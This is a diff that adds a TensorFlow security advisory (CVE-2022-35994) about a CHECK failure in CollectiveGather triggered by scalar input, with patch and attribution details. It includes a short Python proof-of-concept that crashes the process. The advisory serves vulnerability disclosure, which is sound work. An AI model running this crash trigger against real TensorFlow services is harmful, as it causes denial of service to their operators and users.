@@ -1,0 +1,25 @@
+<h2>TFSA-2022-126: <code>CHECK</code> fail in <code>CollectiveGather</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35994</p>
+<h3>Impact</h3>
+<p>When <code>CollectiveGather</code> receives an scalar input <code>input</code>, it gives a <code>CHECK</code> fails that can be used to trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+arg_0=1
+arg_1=1
+arg_2=1
+arg_3=1
+arg_4=(3, 3,3)
+arg_5='auto'
+arg_6=0
+arg_7=''
+tf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,
+                            instance_key=arg_3, shape=arg_4,
+                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770">c1f491817dec39a26be3c574e86a88c30f3c4770</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by 刘力源, Information System &amp; Security and Countermeasures Experiments Center, Beijing Institute of Technology.</p>
